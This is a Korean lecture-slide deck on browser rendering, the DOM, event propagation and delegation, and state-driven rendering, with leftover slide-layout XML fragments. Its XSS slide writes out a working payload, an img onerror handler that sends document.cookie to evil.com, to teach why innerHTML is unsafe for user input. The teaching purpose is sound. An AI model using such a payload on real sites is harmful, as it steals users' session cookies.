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6장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브라우저와 DOM · 이벤트 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렌더링 과정, DOM 트리, 이벤트 전파, 상태와 화면의 관계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브라우저가 화면을 그리는 과정을 단계별로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DOM이 HTML 파일과 어떻게 다른지 설명할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전파(캡처·타깃·버블) 3단계를 설명하고 위임을 활용할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리플로우와 리페인트를 구분하고 성능에 미치는 영향을 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 중심 렌더링 구조가 왜 좋은지 설명할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렌더링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8241" y="2781300"/>
            <a:ext cx="75642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41" y="2781300"/>
            <a:ext cx="7564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DOM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9916" y="2781300"/>
            <a:ext cx="102507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9916" y="2781300"/>
            <a:ext cx="102507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0241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0241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리플로우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6579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6579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리페인트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917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2917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이벤트 전파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8647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8647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버블링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3888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3888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이벤트 위임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9618" y="2781300"/>
            <a:ext cx="67434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9618" y="2781300"/>
            <a:ext cx="67434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XSS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99208" y="2781300"/>
            <a:ext cx="140157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99208" y="2781300"/>
            <a:ext cx="140157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상태와 렌더링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브라우저가 화면을 그리는 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브라우저가 화면을 그리는 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517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517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9000" y="2781300"/>
            <a:ext cx="99187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9000" y="2781300"/>
            <a:ext cx="9918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무슨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55800" y="2781300"/>
            <a:ext cx="24892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55800" y="2781300"/>
            <a:ext cx="2489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만들어지는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517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327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파싱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9000" y="3448050"/>
            <a:ext cx="9918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4250" y="3448050"/>
            <a:ext cx="9728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HTML을 읽어 나무로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55800" y="3448050"/>
            <a:ext cx="2489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751050" y="3448050"/>
            <a:ext cx="2298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517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327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파싱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99000" y="4143375"/>
            <a:ext cx="9918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4250" y="4143375"/>
            <a:ext cx="9728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CSS를 읽어 규칙 목록으로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55800" y="4143375"/>
            <a:ext cx="2489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751050" y="4143375"/>
            <a:ext cx="2298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517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327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렌더 트리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99000" y="4838700"/>
            <a:ext cx="9918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4250" y="4838700"/>
            <a:ext cx="9728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DOM + CSSOM을 합쳐 "실제로 보이는 것"만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55800" y="4838700"/>
            <a:ext cx="2489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751050" y="4838700"/>
            <a:ext cx="2298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렌더 트리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517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327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레이아웃(리플로우)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99000" y="5534025"/>
            <a:ext cx="9918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4250" y="5534025"/>
            <a:ext cx="9728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요소의 위치와 크기를 계산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655800" y="5534025"/>
            <a:ext cx="2489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751050" y="5534025"/>
            <a:ext cx="2298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기하 정보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517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327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페인트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99000" y="6229350"/>
            <a:ext cx="9918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94250" y="6229350"/>
            <a:ext cx="9728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색·테두리·그림자를 픽셀로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655800" y="6229350"/>
            <a:ext cx="2489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751050" y="6229350"/>
            <a:ext cx="2298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비트맵 레이어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517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327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합성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99000" y="6924675"/>
            <a:ext cx="9918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94250" y="6924675"/>
            <a:ext cx="9728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레이어들을 겹쳐 최종 화면으로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655800" y="6924675"/>
            <a:ext cx="2489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751050" y="6924675"/>
            <a:ext cx="2298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브라우저가 화면을 그리는 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display: none 인 요소는 렌더 트리에 아예 들어가지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자리도 차지하지 않습니다.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visibility: hidden 은 렌더 트리에는 있고 페인트만 안 되므로 자리는 그대로 남습니다 — 이 차이가 여기서 나옵니다.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리플로우와 리페인트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28087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8087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461970" y="2781300"/>
            <a:ext cx="730341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1970" y="2781300"/>
            <a:ext cx="730341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리플로우(레이아웃)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03485" y="2781300"/>
            <a:ext cx="734151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03485" y="2781300"/>
            <a:ext cx="734151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리페인트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28087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09037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1970" y="3448050"/>
            <a:ext cx="73034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57220" y="3448050"/>
            <a:ext cx="71129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크기·위치가 바뀔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03485" y="3448050"/>
            <a:ext cx="73415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98735" y="3448050"/>
            <a:ext cx="71510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색·그림자만 바뀔 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28087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09037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1970" y="4171950"/>
            <a:ext cx="73034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7220" y="4171950"/>
            <a:ext cx="71129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비쌈 — 주변 요소까지 다시 계산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03485" y="4171950"/>
            <a:ext cx="73415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98735" y="4171950"/>
            <a:ext cx="71510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상대적으로 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28087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09037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유발 속성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1970" y="4895850"/>
            <a:ext cx="73034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57220" y="4895850"/>
            <a:ext cx="71129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width · height · margin · padding · top · f…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03485" y="4895850"/>
            <a:ext cx="73415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98735" y="4895850"/>
            <a:ext cx="71510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color · background · box-shadow · visibility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28087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09037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거의 무료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1970" y="5619750"/>
            <a:ext cx="73034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57220" y="5619750"/>
            <a:ext cx="71129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03485" y="5619750"/>
            <a:ext cx="73415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98735" y="5619750"/>
            <a:ext cx="71510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transform · opacity (합성 단계에서만 처리)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리플로우와 리페인트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애니메이션에 transform 과 opacity 를 쓰라는 조언이 여기서 나옵니다.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margin이나 top을 애니메이션하면 매 프레임마다 레이아웃을 다시 계산해야 해서 끊깁니다.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리플로우를 줄이는 습관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반복문 안에서 DOM을 계속 건드림 → 매번 리플로우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++)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makeItem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 메모리에서 다 만든 뒤 한 번에 붙임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frag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createDocumentFragment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++)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frag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makeItem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frag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쓰기와 읽기를 번갈아 하면 강제 동기 리플로우가 일어남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style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'100px'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offsetHeight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여기서 브라우저가 즉시 레이아웃을 계산해야 함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style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'50px'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offsetTop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또 계산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 읽기를 모으고 쓰기를 모은다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DOM — 문서의 객체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반드시 구분해야 할 세 가지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 파일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서버에 있는 글자 뭉치. 바뀌지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DOM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 메모리 안의 객체 나무. JavaScript가 바꾸는 것은 이쪽입니다.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DOM과 CSSOM으로 계산해 그린 결과.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JS로 화면을 바꿔도 새로고침하면 원래대로 돌아옵니다. 원본 파일은 그대로니까요.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나무의 가지는 요소만이 아닙니다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8439150" cy="35575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요소를 찾는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156223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15622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7323" y="2781300"/>
            <a:ext cx="512383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7323" y="2781300"/>
            <a:ext cx="512383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돌려주는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99258" y="2781300"/>
            <a:ext cx="464574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99258" y="2781300"/>
            <a:ext cx="464574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살아 있는가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15622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9657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querySelector(sel)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7323" y="3448050"/>
            <a:ext cx="512383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2573" y="3448050"/>
            <a:ext cx="493333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요소 하나 (없으면 null)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99258" y="3448050"/>
            <a:ext cx="464574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4508" y="3448050"/>
            <a:ext cx="445524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15622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9657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querySelectorAll(sel)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7323" y="4171950"/>
            <a:ext cx="512383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2573" y="4171950"/>
            <a:ext cx="493333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정적 NodeList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499258" y="4171950"/>
            <a:ext cx="464574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94508" y="4171950"/>
            <a:ext cx="445524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 (그 순간의 스냅샷)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15622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9657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getElementById(id)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37323" y="4895850"/>
            <a:ext cx="512383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2573" y="4895850"/>
            <a:ext cx="493333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요소 하나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499258" y="4895850"/>
            <a:ext cx="464574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94508" y="4895850"/>
            <a:ext cx="445524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15622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9657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getElementsByClassName()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37323" y="5619750"/>
            <a:ext cx="512383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2573" y="5619750"/>
            <a:ext cx="493333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살아 있는 HTMLCollection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499258" y="5619750"/>
            <a:ext cx="464574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594508" y="5619750"/>
            <a:ext cx="445524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(DOM이 바뀌면 같이 바뀜)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요소를 찾는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querySelector 하나만 알면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CSS에서 쓰던 선택자를 그대로 쓸 수 있어 외울 것이 없습니다.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다만 querySelectorAll 의 결과는 배열이 아니라 NodeList이므로 map 이 없습니다 — [...list] 로 바꿔 쓰세요.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2.3 textContent와 innerHTML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955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95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2781300"/>
            <a:ext cx="74295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6600" y="2781300"/>
            <a:ext cx="7429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innerHTML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6600" y="3448050"/>
            <a:ext cx="7429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1850" y="3448050"/>
            <a:ext cx="7239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 그대로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HTML로 해석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속도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76600" y="4171950"/>
            <a:ext cx="7429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1850" y="4171950"/>
            <a:ext cx="7239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느림 (파싱 필요)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안전성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4895850"/>
            <a:ext cx="7429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71850" y="4895850"/>
            <a:ext cx="7239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위험 (XSS)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76600" y="5619750"/>
            <a:ext cx="7429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71850" y="5619750"/>
            <a:ext cx="7239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선택 · 사용자 입력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직접 쓴 마크업만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XSS가 실제로 일어나는 방식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사용자가 게시글에 이렇게 씁니다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userInput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'&lt;img src=x onerror="location=\'http://evil.com/?c=\'+document.cookie"&gt;'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el.innerHTML = userInput;    // ❌ onerror가 실제로 실행되어 쿠키가 넘어갑니다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el.textContent = userInput;  // ✅ 글자로만 보입니다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태그는 innerHTML로 넣으면 실행되지 않지만,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onerror·onload 같은 이벤트 속성은 실행됩니다.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"script만 막으면 되겠지"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는 통하지 않습니다.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이벤트는 위에서 내려갔다가 다시 올라옵니다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7439025" cy="47434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전파 3단계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버블링은 자식에서 일어난 이벤트가 부모로 거슬러 올라가는 성질입니다.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성질 덕분에 이벤트 위임이 가능해집니다.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부모 하나에만 걸어 둡니다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이 코드가 실행된 뒤 추가된 li에는 이벤트가 안 걸립니다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querySelectorAll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handler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 부모에 걸고, 실제 대상을 안에서 판단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'ul'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target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closest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(!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li 밖을 눌렀으면 무시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위임의 이점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나중에 추가되는 요소에도 자동으로 적용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됩니다 — 목록이 계속 바뀌는 화면에서 결정적입니다.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리스너 개수가 줄어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메모리를 아낍니다. 1000개 항목에 1000개 리스너 대신 1개.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요소를 지울 때 리스너를 따로 제거할 필요가 없습니다.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자주 쓰는 것들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target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실제로 이벤트가 일어난 요소 (자식일 수 있음)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currentTarget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리스너가 걸린 요소 (항상 el)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'click'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preventDefault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기본 동작 막기 (폼 제출·링크 이동)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stopPropagation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부모로의 전파 막기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keydown에서 누른 키 ('Enter', 'Escape', 'a')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clientX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마우스 위치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3.3 이벤트 객체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e.target 과 e.currentTarget 을 헷갈리면 이벤트 위임이 엉뚱하게 동작합니다.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버튼 안의 아이콘을 클릭하면 e.target 은 아이콘이고 e.currentTarget 이 버튼입니다.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closest() 로 원하는 조상을 찾는 것입니다.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scroll·resize·input은 초당 수십~수백 번 발생합니다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디바운스 — 멈춘 뒤 한 번만 (검색어 입력)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debounce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args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clearTimeout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setTimeout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args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'input'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debounce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search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스로틀 — 일정 간격으로만 (스크롤 위치 추적)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scroll·resize·input은 초당 수십~수백 번 발생합니다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throttle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last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args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last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last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args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window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'scroll'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throttle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onScroll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3.4 성능이 걸리는 이벤트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{ passive: true } 는 "이 리스너는 preventDefault() 를 부르지 않겠다"는 약속입니다.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브라우저가 스크롤을 기다리지 않고 바로 처리할 수 있어 모바일 스크롤이 눈에 띄게 부드러워집니다.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상태와 화면의 관계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DOM을 직접 조금씩 고치는 방식(명령형)은 기능이 늘수록 관리가 어려워집니다.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명령형 — 손댈 곳이 계속 늘어난다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addTodo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createElement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children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개수 표시도 따로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children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empty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hidden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빈 상태 안내도 따로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saveBtn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disabled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false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버튼 상태도 따로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기능이 하나 늘 때마다 이 함수도, 삭제 함수도, 수정 함수도 다 고쳐야 합니다.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화면을 바꾸는 코드가 여기저기 흩어지기 때문입니다.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선언형 — 상태를 바꾸고 다시 그린다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[],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filter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'all'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setState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상태가 바뀌면 무조건 다시 그린다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그리는 곳은 여기 하나뿐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filter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matchFilter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선언형 — 상태를 바꾸고 다시 그린다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makeItem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empty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hidden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saveBtn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disabled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addTodo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setState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[...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});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이게 전부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구조가 주는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화면을 고치는 곳이 하나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"어디서 바뀐 거지?"를 찾을 일이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상태만 보면 화면을 알 수 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디버깅이 훨씬 쉬워집니다.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기능 추가가 단순해진다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상태를 바꾸고 render()를 부르면 끝입니다.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React가 자동으로 해 주는 일이 바로 이것입니다.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손으로 해 보면 React가 무슨 수고를 덜어 주는지 정확히 알게 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상태와 화면의 관계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"매번 전부 다시 그리면 느리지 않을까?"는 수십~수백 개 수준에서는 걱정할 일이 아닙니다.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먼저 단순하게 만들고, 실제로 느려지면 그때 최적화하는 것이 순서입니다.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미리 최적화하다 복잡해진 코드가 훨씬 큰 문제가 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6장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브라우저와 DOM · 이벤트 모델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11주차 · 14주차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